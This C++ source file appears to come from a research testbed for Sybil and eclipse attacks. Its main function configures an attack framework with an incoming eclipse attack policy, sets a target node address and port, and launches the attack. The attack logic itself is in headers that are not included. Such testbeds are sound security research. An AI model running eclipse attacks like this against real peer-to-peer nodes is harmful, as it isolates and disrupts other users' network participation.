// "Copyright [2021] <kaistshadow>"

//
// Created by Yonggon Kim on 07/03/2021.
//


#include <AttackBox.h>
#include <policy/EclipseIncomingAttackPolicy.h>
#include <ipdb/SimpleIPDatabase.h>
#include "BLNodePrimitives.h"
#include "BLNodeParams.h"

using namespace sybiltest;

int main() {
    AttackBox<EclipseIncomingAttackPolicy, BLNodePrimitives, BLNodeParams, SimpleIPDatabase> attackBox;
    attackBox.setTarget("1.0.0.1", 3456);
    if (!attackBox.setupAttack()) {
        std::cout << "setup attack failed" << "\n";
        return -1;
    }
    attackBox.startAttack();
    std::cout << "attack finished" << "\n";

    return 0;
}
